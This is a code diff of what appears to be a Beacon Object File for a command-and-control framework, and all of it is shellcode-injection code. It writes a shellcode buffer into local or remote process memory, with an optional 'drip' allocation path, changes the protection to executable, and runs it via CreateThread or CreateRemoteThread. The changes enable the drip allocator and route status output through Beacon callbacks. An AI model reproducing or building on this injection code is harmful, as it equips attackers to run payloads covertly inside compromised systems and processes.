@@ -22,21 +22,21 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         if ( AllocMtd == Alloc::Type::Default ) {
             VmBase = VirtualAlloc( nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
         } else if ( AllocMtd == Alloc::Type::Drip ) {
-            // VmBase = BeaconDripAlloc
+            VmBase = BeaconDripAlloc( Length, PAGE_READWRITE, NtCurrentProcess() ); 
         }
 
-        Printf( "[+] Memory allocated with RW @ %p\n", VmBase );
+        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Memory allocated with RW @ %p\n", VmBase );
 
         Mem::Copy<PVOID>( VmBase, Buffer, Length );
 
-        Printf( "[+] Memory filled with shellcode buffer\n" );
+        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Memory filled with shellcode buffer\n" );
 
         Success = VirtualProtect( VmBase, Length, PAGE_EXECUTE_READ, &TmpVal );
         if ( ! Success ) {
             BeaconPrintf( CALLBACK_ERROR, "[x] Failure in protection change: %d\n", GetLastError() ); return;
         }
 
-        Printf( "[+] Protection changed to RX\n" );
+        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Protection changed to RX\n" );
 
         CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)VmBase, nullptr, 0, &ThreadID );
     } else {
@@ -48,7 +48,7 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         if ( AllocMtd == Alloc::Type::Default ) {
             VmBase = VirtualAllocEx( Handle, nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
         } else if ( AllocMtd == Alloc::Type::Drip ) {
-            // VmBase = BeaconDripAlloc
+            VmBase = BeaconDripAlloc( Length, PAGE_READWRITE, Handle ); 
         }
         
         if ( ! VmBase ) {
@@ -67,7 +67,7 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
             }
         }
         
-        Printf( "[+] Memory filled with shellcode buffer\n" );
+        BeaconPrintf( CALLBACK_NO_PRE_MSG, "[+] Memory filled with shellcode buffer\n" );
 
         Success = VirtualProtectEx( Handle, VmBase, Length, PAGE_EXECUTE_READ, &TmpVal );
         if ( ! Success ) {
@@ -77,9 +77,7 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         CreateRemoteThread( Handle, 0, 0, (LPTHREAD_START_ROUTINE)VmBase, nullptr, 0, &ThreadID );
     }
 
-    Printf( "Shellcode running @ ThreadID %d\n", ThreadID );
-
-    PrintOutput( TRUE );
+    BeaconPrintf( CALLBACK_NO_PRE_MSG, "Shellcode running @ ThreadID %d\n", ThreadID );
 
     return;
 }
